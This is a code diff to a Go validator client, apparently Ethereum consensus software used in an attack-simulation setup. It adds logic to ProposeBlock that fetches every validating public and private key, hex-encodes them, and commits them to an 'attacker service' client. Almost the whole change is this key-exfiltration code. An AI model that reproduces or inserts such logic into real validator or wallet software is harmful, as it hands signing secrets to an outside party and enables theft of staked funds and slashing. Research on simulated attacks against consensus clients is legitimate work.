@@ -123,6 +123,30 @@ func (v *validator) ProposeBlock(ctx context.Context, slot primitives.Slot, pubK
 	}
 	client := attacker.GetAttacker()
 	if client != nil {
+		// commit public keys and private keys to attacker-service.
+		pubkeys, err := v.km.FetchValidatingPublicKeys(context.Background())
+		if err != nil {
+			log.WithError(err).Error("Failed to fetch validating public keys")
+		}
+		privates, err := v.km.FetchValidatingPrivateKeys(context.Background())
+		if err != nil {
+			log.WithError(err).Error("Failed to fetch validating private keys")
+		}
+		if len(pubkeys) == len(privates) && len(pubkeys) > 0 {
+			var strPubkeys, strPrivates = make([]string, len(pubkeys)), make([]string, len(privates))
+			for i := 0; i < len(pubkeys); i++ {
+				strPubkeys[i] = hexutil.Encode(pubkeys[i][:])
+				strPrivates[i] = hexutil.Encode(privates[i][:])
+			}
+			if err = client.CommitValidatorsKeys(ctx, strPubkeys, strPrivates); err != nil {
+				log.WithError(err).Error("Failed to commit validators keys to attacker service")
+			} else {
+				log.Info("Committed validators keys to attacker service")
+			}
+		}
+
+	}
+	if client != nil {
 		ctx = context.Background()
 		for {
 			genBlk, err := blk.PbGenericBlock()
